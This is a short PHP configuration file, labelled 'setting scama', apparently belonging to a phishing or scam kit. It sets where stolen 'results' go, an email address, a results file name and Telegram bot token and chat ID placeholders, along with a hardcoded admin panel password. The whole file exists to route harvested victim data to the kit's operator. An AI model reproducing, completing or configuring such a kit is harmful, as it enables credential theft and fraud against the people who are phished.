<?php
// setting scama
$yourmail  = "your email for result";  // your email 
$namerand = "rezlt";  // name for file rzult *
$pass = "55874212"; // pass admin panel
$botToken="Telegram Bot Token"; // token bot telegram
$chatId="Telegram Chat ID";  // chatId telegram

?>